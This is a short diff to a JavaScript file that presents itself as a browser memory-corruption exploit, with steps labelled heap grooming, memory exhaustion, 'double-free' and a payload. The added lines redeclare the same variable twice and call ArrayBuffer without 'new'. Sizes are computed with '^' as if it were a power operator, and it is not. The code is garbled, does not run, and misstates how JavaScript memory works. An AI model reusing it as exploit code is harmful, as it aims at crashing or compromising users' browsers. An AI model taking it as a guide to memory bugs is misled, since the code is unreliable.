@@ -38,6 +38,7 @@ function groomHeap() {
     return tempArray;
 }
 let varx = 1*(100^100)
+    let varc = 0*(0^0)
 // Step 3: Memory Exhaustion Function
 function memExh() {
     let a = new ArrayBuffer(varx);
@@ -52,7 +53,8 @@ let c = new ArrayBuffer(32);
 //alert("a")
             // Double-free memory
             
-            //let a = null;
+            let a = ArrayBuffer(varc)
+            let a = null;
             // Fill with known data
             for (let j = 0; j < se_a.length; j++) {
                 se_a[varx] = null; // Fill with 'A'
@@ -70,7 +72,7 @@ function payload() {
     let obj = {};
     let iterationCount = 0; // Counter to track number of iterations
 
-    while (true) {
+   // while (true) {
         // String concatenation
       
         largeString += largeString;
@@ -84,7 +86,7 @@ memExh();
         if (iterationCount > 50) {
             break; // Limit iterations to avoid endless loop
         }
-    }
+    //}
 }
 
 // Step 5: Perform the Exploit
